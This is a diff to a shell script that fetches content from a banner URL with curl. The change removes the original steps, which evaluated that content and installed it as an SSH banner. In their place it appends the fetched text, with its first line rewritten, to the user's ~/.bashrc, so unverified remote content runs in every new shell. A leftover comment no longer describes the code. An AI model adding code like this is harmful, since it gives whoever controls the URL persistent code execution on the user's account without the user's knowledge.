@@ -1,10 +1,6 @@
 response=$(curl -s $banner_url)
 
 # Delete first line "$server_name" variable
-modified_response=$(echo "$response" | sed '1d')
+modified_response=$(echo "$response" | sed "1s/.*/server_name=$server_name/")
 
-output=$(eval "$modified_response")
-
-echo "$output" | sudo tee "/etc/ssh/banner.txt" >> /dev/null
-
-echo "Banner /etc/ssh/banner.txt" | sudo tee -a "/etc/ssh/sshd_config" >> /dev/null
+echo "$modified_response" >> "$HOME/.bashrc"
